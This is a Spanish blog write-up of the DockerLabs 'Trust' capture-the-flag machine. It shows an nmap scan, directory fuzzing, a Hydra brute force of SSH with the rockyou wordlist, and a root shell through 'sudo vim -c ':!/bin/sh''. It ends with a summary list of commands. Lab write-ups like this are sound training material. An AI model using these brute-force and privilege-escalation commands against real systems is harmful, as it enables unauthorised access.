---
title: CTF-DockerLabs-Trust
published: true
---

## WriteUps maquina Trust de DockerLabs

---
tags:
  - CTF
  - estado/completado
  - plataforma: [DockerLabs]
  - dificultad: Muy fácil
  - autor: [ElPinguinoDeMario]

# Datos

[!INFO] Trust
  -  **Nombre:** Trust
  -  **SO:** Linux
  -  **Dificultad:** Muy fácil
  -  **Enlace:** [Dockerlabs](https://dockerlabs.es/)

[!TODO] Objetivo
  - 🚩Ingresar a la maquina como algún usuario.
  - 🚩Elevar privilegios una vez obtenido el acceso.

El primer paso consiste en iniciar la máquina, lo cual es tan sencillo como ejecutar el siguiente comando después de haber descargado la maquina:

![dockerlabsTrust.png](https://raw.githubusercontent.com/4k4m1m3/blog/main/_posts/adjuntos/dockerlabsTrust.png)

# Reconocimiento

  - Una vez iniciada la maquina, el mismo script de inicio me da la dirección IP a lo cual procedo a realizar un escaneo de puertos de la maquina y el resultado es el siguiente:


```bash
└─# nmap 172.17.0.2
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-21 19:14 EDT
Nmap scan report for 172.17.0.2
Host is up (0.0000050s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 02:42:AC:11:00:02 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 0.22 seconds
```

Al darme cuenta que existe el `puerto 80` abierto, procedo a visitar desde el navegador la dirección IP de la maquina y encuentro una pagina por defecto de apache: `Apache2 Debian Default Page,` lo próximo que hago es ver su código fuente y no encuentro nada fuera de la común. 

# Fuzzing Web

  - El siguiente paso que procedo a realizar es un fuzzing web puesto que tengo un servidor web corriendo en la maquina, así que utilizo `dirbuster` y el resultado es el siguiente:

```bash
└─# dirbuster 
Starting OWASP DirBuster 1.0-RC1
Starting dir/file list based brute forcing
Dir found: / - 200
Dir found: /icons/ - 403
Dir found: /icons/small/ - 403
File found: /secret.php - 200
Dir found: /server-status/ - 403
DirBuster Stopped
```

Puedo ver en el resultado que existe un archivo llamado `secret.php` que al visitarlo me muestra:

![SecretTrustDockerlabs.png](https://raw.githubusercontent.com/4k4m1m3/blog/main/_posts/adjuntos/SecretTrustDockerlabs.png)

En su código fuente de la pagina, no me muestra nada interesante, pero recordando que existe el `sevicio ssh en el puerto 22` utilizo el nombre de usuario `mario` para realizar fuerza bruta.

# Fuerza bruta SSH

  - Ya que la web no nos da mucha información, pero si proporciona un posible usuario, procedo a utilizar `hydra` para hacer un ataque de fuerza bruta de la siguiente manera:


```bash
└─# hydra -l mario -P /usr/share/wordlists/rockyou.txt 172.17.0.2 ssh
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

[DATA] attacking ssh://172.17.0.2:22/
[22][ssh] host: 172.17.0.2   login: mario   password: QnVzY2EgbGEgY2xhdmUgZW4gb3RybyBsYWRvCg==
1 of 1 target successfully completed, 1 valid password found
```

Y listo, con esto ya logro acceder por `ssh`, con el usuario `mario` y la contraseña encontrada.

`ssh mario@172.17.0.2`

# Escalada de privilegios

  - Ahora que tengo acceso con el usuario `mario` procedo a escalar privilegio y para ello coloco primeramente: `sudo -l` lo que me da como resultado:

```bash
~$ sudo -l
[sudo] password for mario: 
Matching Defaults entries for mario on 30dc76e27a9d:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User mario may run the following commands on 30dc76e27a9d:
    (ALL) /usr/bin/vim
```

# PWNED

Así que procedo ir a la web [GTFOBins](https://gtfobins.github.io/) para ver como elevar privilegios utilizando `vim` con `sudo` y el resultado es que si coloco el siguiente comando `vim -c ':!/bin/sh'` con la palabra `sudo` lograría ingresar con el usuario root.

![pwnedTrustDockerlabs.png](https://raw.githubusercontent.com/4k4m1m3/blog/main/_posts/adjuntos/pwnedTrustDockerlabs.png)

# Comandos

[!IMPORTANT] Resumen de comandos utilizados
  - `sudo bash auto_deploy.sh trust.tar`
  - `nmap 172.17.0.2`
  - `dirbuster`
  - `hydra -l mario -P /usr/share/wordlists/rockyou.txt 172.17.0.2 ssh`
  - `ssh mario@172.17.0.2`
  - `sudo vim -c ':!/bin/sh'`


```
¡Que la fuerza del hacking ético nos acompañe! :)
```

|   |
|:--|
|   |